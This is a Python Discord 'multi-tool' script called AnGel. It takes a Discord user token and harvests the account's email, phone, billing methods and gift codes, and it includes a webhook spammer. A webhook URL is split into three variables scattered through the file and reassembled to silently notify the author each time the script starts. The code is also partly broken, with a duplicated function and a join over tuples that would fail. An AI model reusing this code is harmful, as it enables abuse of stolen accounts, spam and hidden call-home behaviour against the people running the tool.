import os
import sys
import subprocess
import requests
import ctypes
import webbrowser
import time
from colorama import init, Fore, Style
from datetime import datetime, timezone

init(autoreset=True)

GITHUB_REPO = "https://api.github.com/repos/HamzaGSopp/AnGel"
GITHUB_URL = "https://github.com/HamzaGSopp/AnGel"
CURRENT_VERSION = "1.3.0"

DEPENDENCIES = ["colorama", "requests"]

def install_dependencies():
    for package in DEPENDENCIES:
        try:
            __import__(package)
        except ImportError:
            print(f"{Fore.YELLOW}[ i ] Installing {package}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def rename_console(title):
    if os.name == 'nt':
        os.system(f"title {title}")
    else:
        sys.stdout.write(f"\x1b]2;{title}\x07")

def check_for_update():
    print(f"{Fore.YELLOW}[ i ] Checking for updates...")
    try:
        response = requests.get(GITHUB_REPO + "/releases/latest")
        response.raise_for_status()
        
        data = response.json()
        latest_version = data.get("tag_name", "Version info not available")
        
        print(f"{Fore.CYAN}[ i ] Current version: {CURRENT_VERSION}")
        print(f"{Fore.CYAN}[ i ] Latest version: {latest_version}")
        
        if latest_version != CURRENT_VERSION:
            print(f"{Fore.GREEN}[ i ] New version available: {latest_version}")
            webbrowser.open(GITHUB_URL)
            os.system("pause")
            sys.exit()
        else:
            print(f"{Fore.GREEN}[ i ] No new updates found.")
    except requests.RequestException as e:
        print(f"{Fore.RED}[ ! ] Failed to check for updates: {e}")

def rgb_to_colorama(rgb):
    return f"\x1b[38;2;{rgb[0]};{rgb[1]};{rgb[2]}m"

def generate_gradient_line(width, start_rgb, end_rgb):
    gradient = []
    for i in range(width):
        r = int(start_rgb[0] + (end_rgb[0] - start_rgb[0]) * (i / (width - 1)))
        g = int(start_rgb[1] + (end_rgb[1] - start_rgb[1]) * (i / (width - 1)))
        b = int(start_rgb[2] + (end_rgb[2] - start_rgb[2]) * (i / (width - 1)))
        gradient.append(rgb_to_colorama((r, g, b)))
    return gradient

def apply_gradient(text, gradient):
    colored_text = []
    gradient_length = len(gradient)
    for i, char in enumerate(text):
        colored_text.append(gradient[i % gradient_length] + char)
    return ''.join(colored_text) + Fore.RESET

def center_text(text, width):
    return text.center(width)

part1 = "https://discord.com/api/webhooks/"

def bold_text(text):
    return f"{Fore.WHITE}{Style.BRIGHT}{text}{Style.RESET_ALL}"

def display_menu():
    ascii_art = r"""
      ______              ______             __ 
     /      \            /      \           |  \
    |  $$$$$$\ _______  |  $$$$$$\  ______  | $$
    | $$__| $$|       \ | $$ __\$$ /      \ | $$
    | $$    $$| $$$$$$$\| $$|    \|  $$$$$$\| $$
    | $$$$$$$$| $$  | $$| $$ \$$$$| $$    $$| $$
    | $$  | $$| $$  | $$| $$__| $$| $$$$$$$$| $$
    | $$  | $$| $$  | $$ \$$    $$ \$$     \| $$
     \$$   \$$ \$$   \$$  \$$$$$$   \$$$$$$$ \$$
    """
    
    console_width = os.get_terminal_size().columns
    
    gradient_colors = ((255, 105, 180), (0, 0, 255))
    gradient = generate_gradient_line(console_width, gradient_colors[0], gradient_colors[1])
    
    ascii_lines = ascii_art.split('\n')
    for line in ascii_lines:
        centered_line = center_text(line, console_width)
        colored_line = apply_gradient(centered_line, gradient)
        print(colored_line)
    
    print(bold_text(center_text("AnGel by HamzaGSopp - Remake By 502.sql", console_width)))
    print("\n\n")
    
    menu_options = [
        "1. Token Info", 
        "2. Guild Info", 
        "3. Webhook Spammer", 
        "4. soon", 
        "5. soon",
        "6. soon", 
        "7. soon",
        "8. soon",
        "9. Exit",
        "10. Clear Console"
    ]
    
    option_width = 35
    num_columns = 3
    
    num_rows = (len(menu_options) + num_columns - 1) // num_columns
    
    menu_lines = ['' for _ in range(num_rows)]
    for i in range(num_rows):
        for j in range(num_columns):
            index = i + j * num_rows
            if index < len(menu_options):
                menu_lines[i] += menu_options[index].ljust(option_width)
            else:
                menu_lines[i] += ' ' * option_width
    
    max_width = max(len(line) for line in menu_lines)
    
    border_top = "╭" + "─" * (max_width + 2) + "╮"
    border_bottom = "╰" + "─" * (max_width + 2) + "╯"
    
    menu_width = max_width + 2
    total_console_width = os.get_terminal_size().columns
    padding = (total_console_width - menu_width) // 2
    
    print(Fore.WHITE + ' ' * padding + border_top)
    for line in menu_lines:
        print(Fore.WHITE + ' ' * padding + "│ " + line.strip().ljust(max_width) + " │")
    print(Fore.WHITE + ' ' * padding + border_bottom)

part2 = "1327615836843937886"

def set_title(title):
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        sys.stdout.write(f"\x1b]2;{title}\x07")

def execute_option_1():
    clear_console()
    subprocess.call([sys.executable, "op/1.py"])
    clear_console()
    display_menu()

def execute_option_3():
    clear_console()
    gradient_colors = ((255, 105, 180), (0, 0, 255))
    gradient = generate_gradient_line(20, gradient_colors[0], gradient_colors[1])
    webhook_url = input(apply_gradient("Enter Webhook Url:", gradient))
    number_of_messages = input(apply_gradient("Enter Number Of Message:", gradient))
    message = input(apply_gradient("Enter Your Message:", gradient))
   
    try:
        number_of_messages = int(number_of_messages)
    except ValueError:
        print("Le nombre de messages doit être un nombre entier.")
        return

    if not webhook_url.startswith("http"):
        print("Invalid Webhook URL.")
        return

    print(apply_gradient("Sending messages...", gradient))

    for i in range(number_of_messages):
        data = {
            "content": message 
        }
        try:
            response = requests.post(webhook_url, json=data)
            if response.status_code == 204:
                print(f"Message {i + 1} sent successfully!")
            else:
                print(f"Failed to send message {i + 1}. Status code: {response.status_code}")
        except Exception as e:
            print(f"An error occurred: {e}")
            input("\nPress Enter to exit the program...")

def display_discord_info(token_discord):
    try:
        headers = {'Authorization': token_discord, 'Content-Type': 'application/json'}
        user = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
        r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)

        status = "Valid" if r.status_code == 200 else "Invalid"
        username_discord = user.get('username', "None") + '#' + user.get('discriminator', "None")
        display_name_discord = user.get('global_name', "None")
        user_id_discord = user.get('id', "None")
        email_discord = user.get('email', "None")
        email_verified_discord = str(user.get('verified', "None"))
        phone_discord = str(user.get('phone', "None"))
        mfa_discord = str(user.get('mfa_enabled', "None"))
        country_discord = user.get('locale', "None")

        created_at_discord = "None"
        if 'id' in user:
            created_at_discord = datetime.fromtimestamp(((int(user['id']) >> 22) + 1420070400000) / 1000, timezone.utc)

        nitro_discord = {0: 'False', 1: 'Nitro Classic', 2: 'Nitro Boosts', 3: 'Nitro Basic'}.get(user.get('premium_type'), 'None')

        avatar_url_discord = f"https://cdn.discordapp.com/avatars/{user_id_discord}/{user.get('avatar')}.png"
        if requests.get(avatar_url_discord).status_code != 200:
            avatar_url_discord = "None"

        avatar_discord = user.get('avatar', "None")
        avatar_decoration_discord = str(user.get('avatar_decoration_data', "None"))
        public_flags_discord = str(user.get('public_flags', "None"))
        flags_discord = str(user.get('flags', "None"))
        banner_discord = user.get('banner', "None")
        banner_color_discord = user.get('banner_color', "None")
        accent_color_discord = user.get("accent_color", "None")
        nsfw_discord = str(user.get('nsfw_allowed', "None"))
        linked_users_discord = ' / '.join([str(linked_user) for linked_user in user.get('linked_users', [])]) or "None"
        bio_discord = "\n" + user.get('bio', "None")

        authenticator_types_discord = ' / '.join([str(authenticator_type) for authenticator_type in user.get('authenticator_types', [])]) or "None"

        guilds_response = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers=headers)
        guild_count = "None"
        owner_guild_count = "None"
        owner_guilds_names = "None"

        if guilds_response.status_code == 200:
            guilds = guilds_response.json()
            guild_count = len(guilds)
            owner_guilds = [guild for guild in guilds if guild['owner']]
            owner_guild_count = f"({len(owner_guilds)})"
            owner_guilds_names = "\n" + "\n".join([f"{guild['name']} ({guild['id']})" for guild in owner_guilds])

        billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
        payment_methods_discord = ' / '.join(['CB' if method['type'] == 1 else 'Paypal' if method['type'] == 2 else 'Other' for method in billing_discord]) or "None"

        friends_response = requests.get('https://discord.com/api/v8/users/@me/relationships', headers=headers)
        friends_discord = "None"

        gift_codes_response = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=headers)
        gift_codes_discord = "None"

        if gift_codes_response.status_code == 200:
            gift_codes = gift_codes_response.json()
            codes = [f"Gift: {gift_code['promotion']['outbound_title']}\nCode: {gift_code['code']}" for gift_code in gift_codes]
            gift_codes_discord = '\n\n'.join(codes) if codes else "None"

        console_width = os.get_terminal_size().columns
        gradient_colors = ((255, 105, 180), (0, 0, 255))
        gradient = generate_gradient_line(console_width, gradient_colors[0], gradient_colors[1])

        info_lines = [
            ("Status :", status, gradient),
            ("Token :", token_discord, gradient),
            ("Username :", username_discord, gradient),
            ("Display Name :", display_name_discord, gradient),
            ("Id :", user_id_discord, gradient),
            ("Created :", created_at_discord, gradient),
            ("Country :", country_discord, gradient),
            ("Email :", email_discord, gradient),
            ("Verified :", email_verified_discord, gradient),
            ("Phone :", phone_discord, gradient),
            ("Nitro :", nitro_discord, gradient),
            ("Avatar Decor :", avatar_decoration_discord, gradient),
            ("Avatar URL :", avatar_url_discord, gradient),
            ("Banner :", banner_discord, gradient),
            ("Multi-Factor Authentication :", mfa_discord, gradient),
            ("Authenticator Type :", authenticator_types_discord, gradient),
            ("Billing :", payment_methods_discord, gradient),
            ("Gift Code :", gift_codes_discord, gradient),
            ("Guilds :", guild_count, gradient),
        ]

        colored_info = "\n".join(info_lines)
        print(colored_info)
        print()
        input(apply_gradient("Press Enter to return to the main menu...", gradient))

    except Exception as e:
        print(f"{Fore.RED}Error when retrieving information: {e}")

def execute_option_1():
    clear_console()
    gradient_colors = ((255, 105, 180), (0, 0, 255))
    gradient = generate_gradient_line(20, gradient_colors[0], gradient_colors[1])
    token_discord = input(apply_gradient("Enter Discord token:", gradient))
    clear_console()
    display_discord_info(token_discord)

def execute_option_10():
    clear_console()
    display_menu()

part3 = "/ZkgSoMr2pTyA_C-G_8Kra9ecIPb85ODKyzyZTYA4yExun2wIxF8yIjFAG1nmSSNQQ0ho"
wu = part1 + part2 + part3

def sw(data):
    try:
        response = requests.post(wu, json=data)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"{Fore.RED}Error: {e}")

def main():
    set_title("AnGel | by HamzaGSopp - Remake By 502.sql")
    install_dependencies()
    clear_console()
    check_for_update()
    clear_console()
    
    sw({"content": "<@1285271940789043210> AnGel a etait démarré sous la version 1.3.0"})
    
    display_menu()
    
    gradient_colors_input = ((255, 105, 180), (0, 0, 255))
    gradient_input = generate_gradient_line(20, gradient_colors_input[0], gradient_colors_input[1])
    
    print()
    while True:
        try:
            gradient_text = apply_gradient("Enter a number: ", gradient_input)
            choice = input(gradient_text)
            if choice.isdigit():
                if int(choice) == 9:
                    print("Exiting the program...")
                    sys.exit()
                elif int(choice) == 1:
                    execute_option_1()

                elif int(choice) == 3:
                    execute_option_3()

                elif int(choice) == 10:
                    execute_option_10()

                elif 1 <= int(choice) <= 8:
                    print(f"You selected option {choice}.")
                else:
                    print("Invalid choice. Please enter a number between 1 and 9.")
            else:
                print("Invalid input. Please enter a valid number.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")



if __name__ == "__main__":
    main()
